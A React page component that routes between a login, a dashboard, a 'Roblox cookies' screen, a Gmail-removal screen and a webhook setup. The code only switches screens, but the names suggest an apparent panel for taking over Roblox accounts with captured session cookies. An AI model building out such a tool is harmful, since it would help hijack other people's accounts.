import { useState } from "react";
import { RainEffect } from "@/components/ui/rain-effect";
import { SnowEffect } from "@/components/ui/snow-effect";
import { PasswordLogin } from "@/components/ui/password-login";
import { Dashboard } from "@/components/ui/dashboard";
import { RobloxCookies } from "@/components/ui/roblox-cookies";
import { VerifyGmailDelete } from "@/components/ui/verify-gmail-delete";
import { SuccessNotification } from "@/components/ui/success-notification";
import { WebhookSetup } from "@/components/ui/webhook-setup";

type Screen =
  | "login"
  | "dashboard"
  | "roblox-cookies"
  | "verify-gmail"
  | "webhook-setup"
  | "success";

const Index = () => {
  const [currentScreen, setCurrentScreen] = useState<Screen>("login");

  const handleLoginSuccess = () => {
    setCurrentScreen("dashboard");
  };

  const handleDeleteGmail = () => {
    setCurrentScreen("roblox-cookies");
  };

  const handleDeleteVerifyGmail = () => {
    setCurrentScreen("verify-gmail");
  };

  const handleCreateWebhook = () => {
    setCurrentScreen("webhook-setup");
  };

  const handleBackToDashboard = () => {
    setCurrentScreen("dashboard");
  };

  const handleSuccess = () => {
    setCurrentScreen("success");
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "dashboard":
        return (
          <Dashboard
            onDeleteGmail={handleDeleteGmail}
            onDeleteVerifyGmail={handleDeleteVerifyGmail}
            onCreateWebhook={handleCreateWebhook}
          />
        );
      case "roblox-cookies":
        return (
          <RobloxCookies
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "verify-gmail":
        return (
          <VerifyGmailDelete
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "webhook-setup":
        return <WebhookSetup onBack={handleBackToDashboard} />;
      case "success":
        return (
          <SuccessNotification onBackToDashboard={handleBackToDashboard} />
        );
      default:
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Darker gradient background - more black than blue */}
      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-slate-800" />

      {/* Additional overlay for more darkness */}
      <div className="absolute inset-0 bg-black/30" />

      {/* Weather effects */}
      <RainEffect />
      <SnowEffect />

      {/* Main content */}
      <div className="relative z-10">{renderScreen()}</div>
    </div>
  );
};

export default Index;
